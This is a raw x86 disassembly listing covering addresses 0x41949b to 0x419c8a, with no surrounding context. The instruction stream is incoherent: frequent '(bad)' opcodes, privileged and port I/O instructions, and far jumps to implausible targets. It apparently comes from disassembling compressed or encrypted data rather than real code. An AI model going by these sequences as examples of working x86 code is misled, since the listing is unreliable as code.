  41949b:	jbe    0x419473
  41949d:	ds push 0xa
  4194a0:	stos   BYTE PTR es:[edi],al
  4194a1:	(bad)  
  4194a2:	inc    ebp
  4194a3:	hlt    
  4194a4:	and    bl,bl
  4194a6:	test   BYTE PTR [ebx],al
  4194a8:	add    dh,BYTE PTR [eax]
  4194aa:	adc    DWORD PTR es:[ebx],ebp
  4194ad:	push   esp
  4194ae:	fstp   TBYTE PTR [edi+esi*4-0x35f7e8b1]
  4194b5:	bound  edx,QWORD PTR [edx]
  4194b7:	pushf  
  4194b8:	and    al,0xad
  4194ba:	fnstenv [ebx+0x4bb8b593]
  4194c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194c1:	jmp    0x9feb:0xbefb6e6d
  4194c8:	es push edx
  4194ca:	rcr    edx,cl
  4194cc:	inc    esp
  4194cd:	push   ds
  4194ce:	add    eax,0xb26050bb
  4194d3:	push   esp
  4194d4:	and    cl,BYTE PTR [ebp-0x19]
  4194d7:	jne    0x4194c6
  4194d9:	fidivr WORD PTR [ebx-0x69]
  4194dc:	(bad)  
  4194dd:	fimul  WORD PTR [eax-0x74]
  4194e0:	jno    0x4194e3
  4194e2:	test   DWORD PTR [edi+edi*8-0x20493c3c],0xa642cf0a
  4194ed:	mov    ebx,edx
  4194ef:	enter  0x7836,0x7c
  4194f3:	mov    edi,0x622ec3e8
  4194f8:	std    
  4194f9:	mov    ds:0x8444a8a5,eax
  4194fe:	ss push 0x367fd36c
  419504:	pop    esp
  419505:	test   DWORD PTR [edi-0x47],ebp
  419508:	and    BYTE PTR [di-0x46b3],0x5d
  41950e:	xor    cl,BYTE PTR [ebp-0x6a]
  419511:	les    ecx,FWORD PTR [edi-0x68]
  419514:	rcr    ebp,0x6f
  419517:	push   0x16
  419519:	aaa    
  41951a:	pop    esi
  41951b:	push   ebp
  41951c:	xchg   ebx,ebx
  41951e:	mov    al,ds:0xa22f3890
  419523:	pop    es
  419524:	push   cs
  419525:	fldenv [edx]
  419527:	aad    0x60
  419529:	mov    bl,0x7f
  41952b:	or     ebx,edi
  41952d:	stos   BYTE PTR es:[edi],al
  41952e:	pop    ecx
  41952f:	movlhps xmm1,xmm4
  419532:	and    DWORD PTR [ecx-0x5bdd73c8],eax
  419538:	popa   
  419539:	scas   eax,DWORD PTR es:[edi]
  41953a:	jo     0x41951f
  41953c:	js     0x4194fa
  41953e:	sbb    dh,BYTE PTR [edx+0x3b9209ff]
  419544:	aad    0xd4
  419546:	outs   dx,DWORD PTR ds:[esi]
  419547:	push   eax
  419548:	mov    dh,0x96
  41954a:	outs   dx,BYTE PTR ds:[esi]
  41954b:	fisub  WORD PTR [ebp-0x70]
  41954e:	aad    0x80
  419550:	mov    bh,BYTE PTR [ebx-0x21]
  419553:	retf   0x8ae9
  419556:	dec    eax
  419557:	(bad)  
  419558:	fwait
  419559:	adc    BYTE PTR [ebx-0x1cb993b8],cl
  41955f:	out    0xea,al
  419561:	lock lock movsx edx,BYTE PTR [edi+0x48]
  419567:	mov    bl,BYTE PTR [edi-0x47]
  41956a:	inc    ebx
  41956b:	es popa 
  41956d:	(bad)  
  41956e:	xor    eax,0xfc8c8809
  419573:	stos   BYTE PTR es:[edi],al
  419574:	sbb    eax,0x2f8f694b
  419579:	push   ebp
  41957a:	scas   al,BYTE PTR es:[edi]
  41957b:	push   ds
  41957c:	dec    ebx
  41957d:	jo     0x419587
  41957f:	lock js 0x4195b0
  419582:	jno    0x41953a
  419584:	push   ebp
  419585:	cmp    DWORD PTR [esi+0x5e],edx
  419588:	loope  0x419603
  41958a:	mov    esi,0x1501482e
  41958f:	cmp    eax,0x233c2115
  419594:	cmp    ecx,DWORD PTR [esi+esi*1+0x8]
  419598:	into   
  419599:	jp     0x4195d5
  41959b:	icebp  
  41959c:	add    DWORD PTR [edi-0x38],ebp
  41959f:	lds    edi,FWORD PTR [eax]
  4195a1:	mov    ecx,0xa810739
  4195a7:	dec    esi
  4195a8:	pop    ecx
  4195a9:	icebp  
  4195aa:	pushf  
  4195ab:	nop
  4195ac:	iret   
  4195ad:	xchg   BYTE PTR [edx],dh
  4195af:	dec    esi
  4195b0:	push   ebp
  4195b1:	shr    BYTE PTR [eax-0x53017b35],0x75
  4195b8:	xchg   esp,eax
  4195b9:	lea    edx,[eax+eax*8-0x257c9388]
  4195c0:	pop    ds
  4195c1:	mov    ecx,0xe72bdfba
  4195c6:	fld    DWORD PTR [esi-0x4577e832]
  4195cc:	jb     0x41963c
  4195ce:	in     eax,dx
  4195cf:	sbb    bh,BYTE PTR [edx-0x26ec2877]
  4195d5:	xchg   edx,eax
  4195d6:	aam    0x81
  4195d8:	and    al,0xdc
  4195da:	push   0xffffffa8
  4195dc:	pop    es
  4195dd:	das    
  4195de:	push   es
  4195df:	aad    0xc0
  4195e1:	inc    ebx
  4195e2:	adc    ch,BYTE PTR [eax-0x55c1c890]
  4195e8:	or     eax,DWORD PTR [edi+ecx*8]
  4195eb:	mov    ecx,0xbedec9a7
  4195f0:	daa    
  4195f1:	mov    ds:0x7dc17793,al
  4195f6:	jle    0x41957c
  4195f8:	push   ebx
  4195f9:	inc    eax
  4195fa:	sbb    eax,0xe5bdc223
  4195ff:	cs call 0x9683c74a
  419605:	mov    eax,ds:0xd5f9091d
  41960a:	test   al,0x6f
  41960c:	test   al,0xd6
  41960e:	mov    bl,0xd2
  419610:	(bad)  
  419611:	inc    edx
  419612:	out    dx,eax
  419613:	jl     0x41966f
  419615:	push   ebx
  419616:	inc    esp
  419617:	cmp    al,0xcf
  419619:	adc    al,0xe3
  41961b:	dec    eax
  41961c:	pop    ebx
  41961d:	daa    
  41961e:	imul   edi,DWORD PTR [ecx],0xd61a0635
  419624:	cmc    
  419625:	retf   
  419626:	stos   BYTE PTR es:[edi],al
  419627:	stos   BYTE PTR es:[edi],al
  419628:	adc    ecx,DWORD PTR [edx+0x47]
  41962b:	cmp    DWORD PTR ds:0x164fb9ae,esi
  419631:	scas   eax,DWORD PTR es:[edi]
  419632:	(bad)  
  419633:	cmp    DWORD PTR [edi],ebx
  419635:	leave  
  419636:	jmp    0x4195e7
  419638:	xchg   ebx,eax
  419639:	clc    
  41963a:	dec    ecx
  41963b:	bound  ecx,QWORD PTR [esi+edi*2]
  41963e:	push   edx
  41963f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419640:	push   ecx
  419641:	(bad)  
  419642:	int    0x67
  419644:	mov    DWORD PTR [bp+di+0x6f],edx
  419648:	and    BYTE PTR [ecx+edx*2],al
  41964b:	mov    edx,0x3e1514e0
  419650:	cmp    al,0xd8
  419652:	sub    ebp,ebp
  419654:	mov    eax,ds:0xfafb1480
  419659:	sti    
  41965a:	cmp    edx,DWORD PTR [ecx]
  41965c:	fstp   TBYTE PTR [esi-0x5a]
  41965f:	fwait
  419660:	sbb    BYTE PTR [ebx+0x64],ch
  419663:	and    al,0x7c
  419665:	pop    edi
  419666:	sbb    DWORD PTR [ecx+0x43],ebx
  419669:	dec    ebp
  41966a:	sub    ch,dh
  41966c:	mov    dh,0xcb
  41966e:	mov    edx,0x138d0d27
  419673:	ret    0x2e73
  419676:	out    0xb2,al
  419678:	sub    al,BYTE PTR ds:[eax]
  41967b:	mov    ebx,0x9edd3a00
  419680:	push   ds
  419681:	push   ecx
  419682:	(bad)  
  419683:	jmp    0x11dfaa27
  419688:	adc    eax,0xcb5965
  41968d:	(bad)  
  41968f:	xor    eax,0xe58aded1
  419694:	lahf   
  419695:	retf   0xafec
  419698:	add    ebx,DWORD PTR [edi+0x49]
  41969b:	xchg   esi,eax
  41969c:	lods   al,BYTE PTR ds:[esi]
  41969d:	jg     0x4196b3
  41969f:	inc    edx
  4196a0:	(bad)  
  4196a1:	mov    dl,0xe9
  4196a3:	je     0x419649
  4196a5:	lock xchg BYTE PTR gs:[edx+0x52afb0d5],bh
  4196ad:	dec    esi
  4196ae:	cmp    DWORD PTR [ecx+0x3b],esp
  4196b1:	aad    0x93
  4196b3:	imul   ebx,DWORD PTR [ecx+0x34],0xcc62beb3
  4196ba:	adc    al,0x1
  4196bc:	(bad)  
  4196bd:	jmp    0x4196b7
  4196bf:	ror    BYTE PTR [edi+0x65],cl
  4196c2:	sub    DWORD PTR [edi],esp
  4196c4:	or     DWORD PTR [eax],edi
  4196c6:	mov    esp,0x92469735
  4196cb:	mov    ecx,DWORD PTR [edx+0x1a]
  4196ce:	mov    ebp,DWORD PTR ss:[ecx-0x2f116280]
  4196d5:	jmp    0x4196ad
  4196d7:	sub    ah,BYTE PTR [esi-0x78]
  4196da:	ss or  eax,0xf8eaf495
  4196e0:	mov    al,0xc0
  4196e2:	push   cs
  4196e3:	sahf   
  4196e4:	lea    ebp,[eax]
  4196e6:	loopne 0x41966b
  4196e8:	sbb    BYTE PTR [ecx],ch
  4196ea:	and    al,0xb4
  4196ec:	shl    DWORD PTR [esi-0x28afa9e1],0x4e
  4196f3:	inc    esp
  4196f4:	aad    0x9
  4196f6:	mov    dl,0xc6
  4196f8:	cdq    
  4196f9:	cs mov edi,0x7eeb8cd8
  4196ff:	inc    esi
  419700:	pop    ss
  419701:	out    0xa7,al
  419703:	push   ebp
  419704:	lods   eax,DWORD PTR ds:[esi]
  419705:	add    edx,DWORD PTR [edx]
  419707:	inc    edx
  419708:	ror    DWORD PTR [edx-0x62e84229],0xd0
  41970f:	es lock and eax,0x4d470a6a
  419716:	call   0x8ab0:0xafec7834
  41971d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41971e:	outs   dx,DWORD PTR ds:[esi]
  41971f:	outs   dx,DWORD PTR ds:[esi]
  419720:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419721:	ja     0x419706
  419723:	jmp    0x4196d5
  419725:	in     eax,0xc1
  419727:	push   esi
  419728:	les    esp,FWORD PTR [edi]
  41972a:	jmp    0x419756
  41972c:	sub    edx,DWORD PTR [ecx+ebx*4-0x13]
  419730:	dec    ebx
  419731:	mov    esp,0x246db67b
  419736:	lahf   
  419737:	lods   eax,DWORD PTR ds:[esi]
  419738:	jns    0x4196d1
  41973a:	jl     0x41977c
  41973c:	std    
  41973d:	test   eax,0xd1a417f3
  419742:	test   DWORD PTR [ecx],0x8254ea50
  419748:	test   DWORD PTR [edi-0x13],edx
  41974b:	add    BYTE PTR [eax+edi*1-0x2352d8ae],ah
  419752:	(bad)  
  419754:	lahf   
  419755:	fcomp  QWORD PTR [edx+0x4c]
  419758:	mov    esp,0x6c2439f1
  41975d:	sbb    DWORD PTR [ebp+0x200594d0],esp
  419763:	push   ebx
  419764:	xchg   BYTE PTR [edi-0x6cd99251],cl
  41976a:	mov    edi,0x17468f3
  41976f:	inc    edx
  419770:	or     BYTE PTR [ecx],dl
  419772:	mov    eax,0x9ff0bf54
  419777:	fs popa 
  419779:	sti    
  41977a:	dec    eax
  41977b:	daa    
  41977c:	in     eax,0x17
  41977e:	nop
  41977f:	in     eax,dx
  419780:	and    eax,0x94836d75
  419785:	push   ebp
  419786:	xor    ch,BYTE PTR [edi]
  419788:	jnp    0x419712
  41978a:	and    bh,bl
  41978c:	or     BYTE PTR [esi],0xd8
  41978f:	inc    ebx
  419790:	mov    ebx,0x161d984b
  419795:	and    eax,0xb552f127
  41979a:	push   esi
  41979b:	adc    ch,BYTE PTR [ebx+0x81af420]
  4197a1:	ror    DWORD PTR [ecx],cl
  4197a3:	(bad)
  4197a7:	add    ch,BYTE PTR [edi]
  4197a9:	into   
  4197aa:	jo     0x419735
  4197ac:	xchg   edi,eax
  4197ad:	mov    cl,0xb5
  4197af:	mov    dh,0x55
  4197b1:	mov    ds:0xed134fc4,al
  4197b6:	pop    ebx
  4197b7:	sbb    eax,0xb9d4ab6c
  4197bc:	sbb    DWORD PTR ds:[ebp+0x4e],ebx
  4197c0:	mov    edx,0x3c1ccd74
  4197c5:	push   ds
  4197c6:	jmp    0x9a9b:0x1e112fea
  4197cd:	shr    DWORD PTR ds:0xb86dadff,0x48
  4197d4:	stos   BYTE PTR es:[edi],al
  4197d5:	cmp    al,0x56
  4197d7:	imul   ebp,edx,0x157cd6bd
  4197dd:	add    eax,0xde2122d1
  4197e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197e3:	adc    ch,BYTE PTR [esi+0x20]
  4197e6:	jmp    0x945b6b3d
  4197eb:	ins    BYTE PTR es:[edi],dx
  4197ec:	ins    DWORD PTR es:[edi],dx
  4197ed:	sti    
  4197ee:	loop   0x4197a8
  4197f0:	jne    0x419848
  4197f2:	push   esp
  4197f3:	(bad)  
  4197f4:	sub    al,0x7a
  4197f6:	cmp    cl,BYTE PTR [ecx-0x63]
  4197f9:	test   DWORD PTR [esi+0x51911054],esi
  4197ff:	sahf   
  419800:	or     DWORD PTR [edx],ebp
  419802:	adc    BYTE PTR [ebx-0x5df015a4],bh
  419808:	rol    BYTE PTR [esi-0x37],0x9
  41980c:	aam    0x13
  41980e:	retf   0xf9d
  419811:	push   ss
  419812:	lea    ebp,[ecx+ecx*1]
  419815:	pop    ebx
  419816:	xchg   esp,eax
  419817:	aam    0xd7
  419819:	mov    ds:0xc2f0e828,eax
  41981e:	xor    WORD PTR ds:0x19146c05,cx
  419825:	jl     0x419883
  419827:	sbb    esi,ebx
  419829:	outs   dx,BYTE PTR ds:[esi]
  41982a:	pop    ebx
  41982b:	or     al,BYTE PTR [ecx]
  41982d:	out    0x86,eax
  41982f:	test   al,0xa9
  419831:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419832:	lods   eax,DWORD PTR ds:[esi]
  419833:	mov    esp,0x31acb758
  419838:	jmp    0x5fd1f660
  41983d:	es push ebp
  41983f:	sbb    al,0x36
  419841:	out    dx,eax
  419842:	hlt    
  419843:	adc    ebp,ecx
  419845:	out    0x3b,eax
  419847:	ror    edi,0xb1
  41984a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41984b:	daa    
  41984c:	std    
  41984d:	push   esp
  41984e:	push   ebp
  41984f:	sub    esp,ecx
  419851:	gs ret 
  419853:	sub    eax,0x140225ac
  419858:	std    
  419859:	cs cmp eax,0x81826301
  41985f:	popa   
  419860:	imul   ebx,DWORD PTR [edx],0xffffffe6
  419863:	mov    al,ds:0xa62c597e
  419868:	xchg   ebx,eax
  419869:	lods   al,BYTE PTR ds:[esi]
  41986a:	(bad)
  41986e:	jne    0x41983b
  419870:	in     eax,dx
  419871:	fsubr  QWORD PTR [eax+0xd]
  419874:	add    ebx,edx
  419876:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419877:	out    dx,eax
  419878:	xlat   BYTE PTR ds:[ebx]
  419879:	mov    al,ds:0x59ed76fb
  41987e:	scas   al,BYTE PTR es:[edi]
  41987f:	retf   0xeaa8
  419882:	xchg   esi,eax
  419883:	test   DWORD PTR [eax],edx
  419885:	shl    DWORD PTR [esi],1
  419887:	out    dx,eax
  419888:	aas    
  419889:	dec    esp
  41988a:	cmp    al,0x3b
  41988c:	cmp    WORD PTR [esp+esi*2+0x28916505],dx
  419894:	adc    DWORD PTR [edx+0x3a],esp
  419897:	iret   
  419898:	mov    edx,0x5d0285e5
  41989d:	out    0x38,al
  41989f:	jmp    0xf17e:0x9d25b7ad
  4198a6:	mov    ds:0xa755fd9e,eax
  4198ab:	cmp    al,0x39
  4198ad:	popf   
  4198ae:	mov    ds:0x95d2636d,eax
  4198b3:	int3   
  4198b4:	imul   eax,ebx,0xd70b791a
  4198ba:	adc    DWORD PTR [esi+esi*2],edi
  4198bd:	data16 sbb BYTE PTR [edi-0x196950c5],dh
  4198c4:	xor    al,0x8e
  4198c6:	xchg   esi,eax
  4198c7:	mov    esi,0x24c916f5
  4198cc:	pop    ebp
  4198cd:	add    dl,BYTE PTR [edx+0x54]
  4198d0:	fst    QWORD PTR [esi-0x18]
  4198d3:	adc    esi,ebp
  4198d5:	popf   
  4198d6:	jecxz  0x41985c
  4198d8:	push   cs
  4198d9:	lock ret 0xd9d2
  4198dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198de:	repz lahf 
  4198e0:	call   DWORD PTR [ecx-0x395bfd18]
  4198e6:	and    al,0xfd
  4198e8:	in     eax,0x4c
  4198ea:	ins    DWORD PTR es:[edi],dx
  4198eb:	in     eax,dx
  4198ec:	or     al,0xa7
  4198ee:	mov    ch,0x89
  4198f0:	mov    ebx,0x7680df91
  4198f5:	mov    ds:0x41218b47,al
  4198fa:	and    BYTE PTR [edi+eax*2+0x6],dh
  4198fe:	test   al,0x65
  419900:	lea    eax,[ebp-0x24]
  419903:	mov    esp,DWORD PTR [edi+0x4a]
  419906:	cmp    al,0x57
  419908:	mov    ds,WORD PTR [edi+0x22]
  41990b:	pop    ds
  41990c:	sub    BYTE PTR [eax+0x27ef39e2],cl
  419912:	sub    eax,0xe862e6cd
  419917:	pop    eax
  419918:	mov    ah,0x62
  41991a:	int    0xac
  41991c:	add    al,0x7b
  41991f:	cmp    al,0x96
  419921:	(bad)  
  419922:	pop    ss
  419923:	push   ds
  419924:	cmp    cl,dl
  419926:	(bad)  
  419927:	pop    ss
  419928:	test   eax,0x5a911111
  41992d:	add    ch,bl
  41992f:	cmp    BYTE PTR [ebp-0x6c],al
  419932:	xchg   esi,eax
  419933:	cmp    eax,0x95f11aa9
  419938:	sub    ch,BYTE PTR [edx+0x20]
  41993b:	pop    esp
  41993c:	out    dx,al
  41993d:	and    edi,DWORD PTR [eax]
  41993f:	jmp    0xeb0b:0xf83d2249
  419946:	jg     0x419980
  419948:	fisub  DWORD PTR [eax+edi*8-0x33]
  41994c:	inc    edx
  41994d:	sub    cl,al
  41994f:	in     eax,0x8f
  419951:	dec    edx
  419952:	enter  0x1163,0x75
  419956:	shl    dl,cl
  419958:	mov    ecx,0x67576fb5
  41995d:	xchg   edx,eax
  41995e:	mov    ds:0x26b6af41,eax
  419963:	jl     0x419916
  419965:	and    esi,DWORD PTR [ebp+0x3f]
  419968:	fdivr  QWORD PTR [eax+ebp*8]
  41996b:	loope  0x4199c3
  41996d:	ins    DWORD PTR es:[edi],dx
  41996e:	inc    esi
  41996f:	ror    BYTE PTR [ebx+0x3c],1
  419972:	mov    WORD PTR [ecx+0x4795d7e0],?
  419978:	or     esi,DWORD PTR [eax]
  41997a:	imul   ebp,DWORD PTR [ebp+0x65d25fab],0x3aa6c854
  419984:	cmp    dl,bh
  419986:	into   
  419987:	inc    edx
  419988:	mov    ds:0xa5b1d167,eax
  41998d:	push   ecx
  41998e:	fcmovnb st,st(2)
  419990:	sbb    eax,0xcb57be1d
  419995:	add    al,0x0
  419997:	sub    cl,cl
  419999:	add    edx,DWORD PTR [edx]
  41999b:	xor    BYTE PTR [ecx+0x6d],dh
  41999e:	xor    DWORD PTR [eax],esp
  4199a0:	mov    ecx,0x448874dc
  4199a5:	shr    BYTE PTR [ebp+0x34],0xba
  4199a9:	mov    es,WORD PTR [edx]
  4199ab:	mov    WORD PTR [ebx+0x75],?
  4199ae:	lahf   
  4199af:	jb     0x419962
  4199b1:	bound  edi,QWORD PTR [esi]
  4199b3:	aam    0xe2
  4199b5:	cmp    eax,DWORD PTR [edi+0x25]
  4199b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199b9:	push   cs
  4199ba:	xor    eax,0x997cb47b
  4199bf:	mov    ebx,0x59cf84f0
  4199c4:	pop    ebx
  4199c5:	repz and bl,bl
  4199c8:	mov    eax,ds:0xff869e6a
  4199cd:	lea    eax,[edi-0x61b77add]
  4199d3:	dec    ecx
  4199d4:	jnp    0x419a3d
  4199d6:	test   al,0x9b
  4199d8:	fist   DWORD PTR [edi+0x26]
  4199db:	(bad)  
  4199dc:	loope  0x4199c3
  4199de:	jg     0x4199be
  4199e0:	hlt    
  4199e1:	rcl    DWORD PTR [esi+0x4c],1
  4199e4:	xor    al,0xec
  4199e6:	jae    0x419a0f
  4199e8:	xchg   ecx,eax
  4199e9:	sbb    ebp,ebp
  4199eb:	lea    ecx,[edx]
  4199ed:	fldcw  WORD PTR [esi+ecx*4]
  4199f0:	xor    DWORD PTR [edi],esp
  4199f2:	imul   esi,DWORD PTR [edi+ebp*8+0xfe264ad],0xf3498bf
  4199fd:	and    ebx,ebp
  4199ff:	fsub   QWORD PTR [eax]
  419a01:	lea    edx,gs:[ebx+0x78]
  419a05:	push   edi
  419a06:	sbb    DWORD PTR [edi],0xffffffc4
  419a09:	mov    bl,0xb6
  419a0b:	repz lds esp,FWORD PTR [ebx]
  419a0e:	loop   0x4199bb
  419a10:	push   edx
  419a11:	or     DWORD PTR [eax-0x61],esi
  419a14:	rol    DWORD PTR [ebp+0x5e],1
  419a17:	sub    esi,DWORD PTR [edi+0x2c]
  419a1a:	clc    
  419a1b:	push   0xffffffa4
  419a1d:	xlat   BYTE PTR ds:[ebx]
  419a1e:	test   cl,al
  419a20:	fadd   QWORD PTR [ebx]
  419a22:	inc    ecx
  419a23:	and    BYTE PTR [esi],0xcc
  419a26:	dec    edx
  419a27:	dec    edx
  419a28:	and    eax,0x19617e81
  419a2d:	dec    ebx
  419a2e:	xor    BYTE PTR [eax],al
  419a30:	das    
  419a31:	mov    edx,0xe4c7c334
  419a36:	xor    ebp,esi
  419a38:	test   edx,ebx
  419a3a:	shl    BYTE PTR [esi-0x6c979c3d],0x82
  419a41:	dec    ecx
  419a42:	jbe    0x4199e8
  419a44:	jno    0x419a84
  419a46:	(bad)  
  419a47:	inc    esi
  419a49:	es lock push ss
  419a4c:	sbb    DWORD PTR [ebp-0x5f092413],ecx
  419a52:	ins    BYTE PTR es:[edi],dx
  419a53:	out    dx,eax
  419a54:	pop    ecx
  419a55:	mov    ebx,0x407bd8f3
  419a5a:	add    esp,DWORD PTR es:[eax+0x640403e7]
  419a61:	inc    edi
  419a62:	dec    esi
  419a63:	push   ebp
  419a64:	cli    
  419a65:	or     eax,0x783fd275
  419a6a:	scas   eax,DWORD PTR es:[edi]
  419a6b:	mov    al,ds:0x6726908d
  419a70:	xchg   esp,eax
  419a71:	jae    0x419a5b
  419a73:	repz sub al,0xb2
  419a76:	sti    
  419a77:	xchg   DWORD PTR ds:0x94a2be89,eax
  419a7d:	adc    al,0x7d
  419a7f:	and    dl,BYTE PTR [esi+0x37a9f0e0]
  419a85:	jae    0x419a25
  419a87:	ret    
  419a88:	ret    0xd97e
  419a8b:	mov    edi,0x32fb5df2
  419a90:	ret    
  419a91:	pop    ebp
  419a92:	jge    0x419a3a
  419a94:	clc    
  419a95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a96:	fst    QWORD PTR [eax-0x31f1064d]
  419a9c:	not    BYTE PTR gs:[edx+eiz*2]
  419aa0:	and    bl,BYTE PTR [ecx-0x1a313132]
  419aa6:	test   DWORD PTR [ebp-0x5a4c2f25],esp
  419aac:	or     DWORD PTR [edx-0x74],esp
  419aaf:	shl    BYTE PTR [esp+esi*2],0x64
  419ab3:	mov    eax,ds:0x11d7f365
  419ab8:	out    0x4b,al
  419aba:	div    BYTE PTR [edi+ebx*1]
  419abd:	mov    al,0x21
  419abf:	out    dx,al
  419ac0:	or     BYTE PTR [eax+eax*2],0x6c
  419ac4:	mov    dh,0xa
  419ac6:	inc    ebx
  419ac7:	aas    
  419ac8:	pop    esi
  419ac9:	aad    0xde
  419acb:	fwait
  419acc:	lods   eax,DWORD PTR ds:[esi]
  419acd:	les    ebp,FWORD PTR [ebp-0x1e]
  419ad0:	fucomi st,st(7)
  419ad2:	xor    bl,BYTE PTR [ebp-0x64]
  419ad5:	pop    es
  419ad6:	xchg   ebp,eax
  419ad7:	fisttp QWORD PTR ds:0xf6d69266
  419add:	mov    ds:0x9f08e6c,eax
  419ae2:	inc    eax
  419ae3:	das    
  419ae4:	std    
  419ae5:	int    0x10
  419ae7:	mov    eax,ds:0x649b479a
  419aec:	inc    ebx
  419aee:	test   al,0xdb
  419af0:	into   
  419af1:	ror    bh,cl
  419af3:	sbb    al,0xb7
  419af5:	cmp    BYTE PTR [eax+0x4266ade6],ah
  419afb:	repnz shl DWORD PTR [ecx-0x23],0x31
  419b00:	repz fsub QWORD PTR [eax]
  419b03:	cs inc edi
  419b05:	ins    DWORD PTR es:[edi],dx
  419b06:	popf   
  419b07:	lock pop ds
  419b09:	fisttp QWORD PTR [ecx+0x239903dd]
  419b0f:	fucomi st,st(0)
  419b11:	jg     0x419b63
  419b13:	mov    ebx,0xf7c22320
  419b18:	iret   
  419b19:	add    BYTE PTR [edx],0x51
  419b1c:	mov    al,0x26
  419b1e:	cld    
  419b1f:	pop    ebp
  419b20:	dec    edx
  419b21:	cmp    ebp,DWORD PTR [ecx]
  419b23:	or     BYTE PTR [esi-0x69c76db7],bl
  419b29:	mov    eax,ds:0xf17b2506
  419b2e:	mov    ebp,0xda11f380
  419b33:	pop    edx
  419b34:	ror    al,0x8e
  419b37:	and    al,0x1a
  419b39:	shl    ecx,1
  419b3b:	add    dl,BYTE PTR [eax-0x28]
  419b3e:	or     BYTE PTR ds:0x38c5569a,al
  419b44:	cs or  eax,0x465381e
  419b4a:	popf   
  419b4b:	pop    edx
  419b4c:	xchg   edx,eax
  419b4d:	xlat   BYTE PTR ds:[ebx]
  419b4e:	push   ebp
  419b4f:	mov    bl,0xb9
  419b51:	add    eax,edi
  419b53:	sar    DWORD PTR [edi-0x70fba549],cl
  419b59:	inc    esi
  419b5a:	cmp    ch,ah
  419b5c:	cmp    cl,BYTE PTR [edi]
  419b5e:	addr16 jnp 0x419b12
  419b61:	ds mov ecx,ebp
  419b64:	adc    edx,DWORD PTR fs:[ebx]
  419b67:	adc    BYTE PTR [edi+esi*1-0x10f22d8b],0x86
  419b6f:	fld    QWORD PTR [ecx+0x7a8740c1]
  419b75:	dec    edi
  419b76:	push   eax
  419b77:	mov    ds:0x62ab7cff,eax
  419b7c:	loope  0x419b89
  419b7e:	xor    ah,BYTE PTR [esi]
  419b80:	add    ah,BYTE PTR [edi]
  419b82:	imul   BYTE PTR [esi+edi*1-0x44]
  419b86:	repnz sub DWORD PTR [edi-0x7cec5c48],0x64d4ddcf
  419b91:	cld    
  419b92:	outs   dx,DWORD PTR ds:[esi]
  419b93:	sub    al,0x4b
  419b95:	cmp    esi,eax
  419b97:	xor    BYTE PTR [edx+0x6f],bh
  419b9a:	aad    0x16
  419b9c:	mov    WORD PTR [edi],ds
  419b9e:	sbb    cl,BYTE PTR [ebp-0x31ed0db]
  419ba4:	test   DWORD PTR [edx-0x1b77bfc9],eax
  419baa:	or     dl,BYTE PTR [edi+0x56a10355]
  419bb0:	(bad)  
  419bb1:	leave  
  419bb2:	sbb    eax,0xbff588d5
  419bb7:	mov    ebp,0xe4453848
  419bbc:	sbb    DWORD PTR [edi+edx*1],esp
  419bbf:	jl     0x419b9b
  419bc1:	in     eax,0x6f
  419bc3:	push   0x45
  419bc5:	push   es
  419bc6:	sar    DWORD PTR [esi],cl
  419bc8:	xor    esi,esp
  419bca:	les    ebx,FWORD PTR [edx]
  419bcc:	pop    esp
  419bcd:	cld    
  419bce:	push   edx
  419bcf:	icebp  
  419bd0:	push   ds
  419bd1:	(bad)  
  419bd2:	or     al,0xdc
  419bd4:	push   edi
  419bd5:	mov    cl,0x8e
  419bd7:	or     eax,0xcb0c66ef
  419bdc:	ret    
  419bdd:	in     eax,dx
  419bde:	inc    ebx
  419bdf:	scas   al,BYTE PTR es:[edi]
  419be0:	xchg   edi,eax
  419be1:	sbb    dh,BYTE PTR [bp+si+0x609d]
  419be6:	xchg   esp,eax
  419be7:	mov    bl,0xdd
  419be9:	xchg   ebx,eax
  419bea:	sub    al,bh
  419bec:	int    0xfb
  419bee:	jnp    0x419c1d
  419bf0:	popa   
  419bf1:	adc    BYTE PTR [eax+0x1e],bl
  419bf4:	adc    eax,0x8e25819
  419bf9:	call   0x5fdc:0x27588eb2
  419c00:	ror    BYTE PTR [edx-0x68155dce],cl
  419c06:	jae    0x419bdc
  419c08:	retf   
  419c09:	xor    dh,BYTE PTR ds:0xfb9a0730
  419c0f:	xchg   ebp,eax
  419c10:	pop    edx
  419c11:	push   ds
  419c12:	into   
  419c13:	mov    dl,0xea
  419c15:	ret    0x87b6
  419c18:	sahf   
  419c19:	lds    edx,FWORD PTR [edi-0xc46abc5]
  419c1f:	mov    al,ds:0x8cfba474
  419c24:	dec    esi
  419c25:	div    ebx
  419c27:	mov    eax,0x364853f1
  419c2c:	js     0x419bf8
  419c2e:	je     0x419ca6
  419c30:	dec    esp
  419c31:	aad    0x30
  419c33:	into   
  419c34:	ds inc esi
  419c36:	leave  
  419c37:	mov    cl,0x18
  419c39:	mov    dh,0x1e
  419c3b:	outs   dx,DWORD PTR ds:[esi]
  419c3c:	and    bh,BYTE PTR [eax-0x3b4bf4]
  419c42:	mov    al,ds:0xa98644f0
  419c47:	in     eax,0xbc
  419c49:	adc    BYTE PTR [ebx-0x1c],bh
  419c4c:	pushf  
  419c4d:	push   ebx
  419c4e:	(bad)  
  419c50:	push   edx
  419c51:	stc    
  419c52:	and    BYTE PTR [ebx+0x1066f34e],ch
  419c58:	loope  0x419ca4
  419c5a:	call   0xabb21716
  419c5f:	mov    ecx,0x41346f5e
  419c64:	mov    esp,0xb4df9c9e
  419c69:	imul   ebp,ecx,0x15
  419c6c:	call   0x27faaf2f
  419c71:	lds    ebp,FWORD PTR [esi]
  419c73:	sbb    BYTE PTR [ecx+0x137a3860],dl
  419c79:	xlat   BYTE PTR ds:[ebx]
  419c7a:	adc    BYTE PTR ds:0xed436a0,ch
  419c80:	imul   esp,DWORD PTR [esi],0x28
  419c83:	test   al,0x71
  419c85:	test   cl,dl
  419c87:	stos   BYTE PTR es:[edi],al
  419c88:	loope  0x419cb6
  419c8a:	test   eax,0xf1549eb7
